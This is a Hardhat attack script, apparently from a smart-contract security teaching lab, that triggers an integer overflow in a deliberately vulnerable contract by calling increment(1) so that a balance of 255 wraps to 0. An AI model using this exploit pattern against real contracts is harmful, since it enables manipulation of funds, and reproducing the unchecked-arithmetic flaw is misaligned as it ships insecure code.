const { ethers } = require("hardhat");
const fs = require("fs");
const path = require("path");

async function main() {
  console.log("🚀 Initiating attack on SC08_IntegerOverflowAndUnderflow_Vulnerable...");

  // --- 1. GET THE SIGNERS ---
  const [deployer, attacker] = await ethers.getSigners();

  console.log(`Deployer Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attacker.address}`);

  // --- 2. GET THE DEPLOYED CONTRACT ---
  const envPath = path.join(__dirname, "..", "frontend", ".env");
  if (!fs.existsSync(envPath)) {
    throw new Error("❌ Could not find the .env file in frontend/. Please deploy contracts first.");
  }
  const envFile = fs.readFileSync(envPath, "utf8");
  const addressMatch = envFile.match(/VITE_SC08_VULNERABLE_ADDRESS='(.*)'/);

  if (!addressMatch) {
    throw new Error("❌ Could not find the vulnerable contract address in frontend/.env. Please deploy contracts first.");
  }
  const vulnerableContractAddress = addressMatch[1];
  console.log(`\n🎯 Target Contract Address: ${vulnerableContractAddress}`);

  const vulnerableContract = await ethers.getContractAt("SC08_IntegerOverflowAndUnderflow_Vulnerable", vulnerableContractAddress);

  // --- 3. EXECUTE THE ATTACK ---
  console.log("\n💰 Checking balance before the attack...");
  const balanceBefore = await vulnerableContract.balance();
  console.log(`   - Balance before overflow: ${balanceBefore.toString()}`);

  if (balanceBefore.toString() !== "255") {
    console.warn("⚠️  Warning: Initial balance is not 255. The contract might not be in its initial state.");
  }

  console.log("\n💥 ATTACKING: Calling the increment(1) function to cause an overflow...");
  const tx = await vulnerableContract.connect(attacker).increment(1);
  await tx.wait();
  console.log("✅ Attack transaction successful!");

  console.log("\n💰 Checking balance after the attack...");
  const balanceAfter = await vulnerableContract.balance();
  console.log(`   - Balance after overflow: ${balanceAfter.toString()}`);

  if (balanceAfter.toString() === "0") {
    console.log("\n🎉 SUCCESS: The balance has overflowed and wrapped around to 0!");
  } else {
    console.log("\n😞 FAILED: The balance did not overflow as expected.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
